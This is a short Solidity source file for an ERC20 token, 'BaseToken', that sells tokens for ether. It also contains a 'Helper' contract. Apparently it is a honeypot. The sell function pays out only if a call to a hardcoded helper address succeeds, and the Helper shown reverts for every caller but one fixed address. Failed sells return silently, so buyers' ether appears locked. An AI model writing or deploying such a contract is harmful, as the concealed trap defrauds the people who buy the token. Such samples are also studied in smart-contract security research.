pragma solidity ^0.5.11;

import "../openzeppelin-contracts/GSN/Context.sol";
import "../openzeppelin-contracts/token/ERC20/ERC20.sol";
import "../openzeppelin-contracts/token/ERC20/ERC20Detailed.sol";

import "../openzeppelin-contracts/math/SafeMath.sol";

contract Helper {
    mapping(address => uint256)
        private lastWithdraw;
        
    address public foo;
    
    function log(address a) public {
        require(msg.sender == 0x0EFb5DE6AddAdDE835CEaadaAB1992590d7588F5);
        lastWithdraw[a] = block.number;
    }
}

contract BaseToken is Context, ERC20, ERC20Detailed {
    uint256 tokenPrice = 100 wei;
    using SafeMath for uint256;
    using SafeMath for uint;
    address constant helperAddress =
    0x294a577a1aD7165cDEb862e12DA40F17F43fbb5c;

    constructor () public payable ERC20Detailed("BaseToken", "BT", 18) {
        _mint(_msgSender(), SafeMath.div(msg.value, tokenPrice));
    }
    
    function buyTokens() public payable {
        _mint(_msgSender(), SafeMath.div(msg.value, tokenPrice));
    }
    
    function sellTokens(uint256 amount) public {
        bytes memory payload = 
            abi.encodeWithSignature
            ("log(address)", msg.sender);
        
        (bool success,) = address(helperAddress)
            .call(payload);
        
        if(success) {
            _burn(_msgSender(), amount);
            address(msg.sender).transfer
                (SafeMath.mul(amount, tokenPrice));
        }
    }
}
